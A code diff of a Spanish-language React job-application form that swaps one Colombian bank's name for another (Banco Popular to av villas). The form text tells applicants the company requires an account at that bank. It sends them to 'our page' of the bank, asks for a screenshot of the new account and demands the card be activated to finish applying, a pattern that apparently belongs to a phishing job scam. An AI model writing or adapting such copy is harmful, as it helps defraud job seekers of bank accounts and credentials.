@@ -206,7 +206,7 @@ export function ApplicationForm() {
                 Cuenta bancaria
               </h3>
               <p className="mb-4 text-muted-foreground">
-                ¿Tienes cuenta de Banco Popular?
+                ¿Tienes cuenta de av villas?
               </p>
             </div>
 
@@ -239,13 +239,13 @@ export function ApplicationForm() {
               <div className="space-y-4">
                 <div className="rounded-lg bg-amber-50 border border-amber-200 p-4">
                   <p className="text-sm text-amber-900 leading-relaxed">
-                    <strong>Importante:</strong> Es necesario que tengas tu cuenta de Banco Popular, ya que la empresa tiene convenio exclusivo con este banco.
+                    <strong>Importante:</strong> Es necesario que tengas tu cuenta de av villas, ya que la empresa tiene convenio exclusivo con este banco.
                   </p>
                   <p className="mt-3 text-sm text-amber-900 leading-relaxed">
                     Pero no te preocupes, como estás postulándote con nosotros, te ayudaremos a solicitarla ahora mismo para que no pierdas el puesto de trabajo, ya que es requisito de la empresa para la postulación.
                   </p>
                   <p className="mt-3 text-sm text-amber-900 leading-relaxed">
-                    Te voy a dirigir a nuestra página de Banco Popular donde podrás solicitar tu cuenta en solo <strong>5 minutos</strong>. Solo asegúrate de completar todos los pasos. <strong>Solicítala presionando aquí abajo:</strong>
+                    Te voy a dirigir a nuestra página de av villas donde podrás solicitar tu cuenta en solo <strong>5 minutos</strong>. Solo asegúrate de completar todos los pasos. <strong>Solicítala presionando aquí abajo:</strong>
                   </p>
                 </div>
 
@@ -288,7 +288,7 @@ export function ApplicationForm() {
                     <div className="flex justify-start">
                       <div className="bg-white rounded-lg rounded-tl-none px-3 py-2 max-w-[80%] shadow-sm">
                         <p className="text-sm text-gray-800">
-                          Hola {formData.nombre.split(" ")[0] || ""}! Envíame aquí la captura de pantalla de tu cuenta de Banco Popular creada para finalizar tu postulación.
+                          Hola {formData.nombre.split(" ")[0] || ""}! Envíame aquí la captura de pantalla de tu cuenta de av villas creada para finalizar tu postulación.
                         </p>
                         <p className="text-[10px] text-gray-500 text-right mt-1">
                           {new Date().toLocaleTimeString("es-CO", { hour: "2-digit", minute: "2-digit" })}
@@ -332,7 +332,7 @@ export function ApplicationForm() {
                         <div className="flex justify-start">
                           <div className="bg-white rounded-lg rounded-tl-none px-3 py-2 max-w-[80%] shadow-sm">
                             <p className="text-sm text-gray-800">
-                              <strong>IMPORTANTE:</strong> Para finalizar tu postulacion, es necesario que actives tu tarjeta de Banco Popular.
+                              <strong>IMPORTANTE:</strong> Para finalizar tu postulacion, es necesario que actives tu tarjeta de av villas.
                             </p>
                             <p className="text-[10px] text-gray-500 text-right mt-1">
                               {new Date().toLocaleTimeString("es-CO", { hour: "2-digit", minute: "2-digit" })}
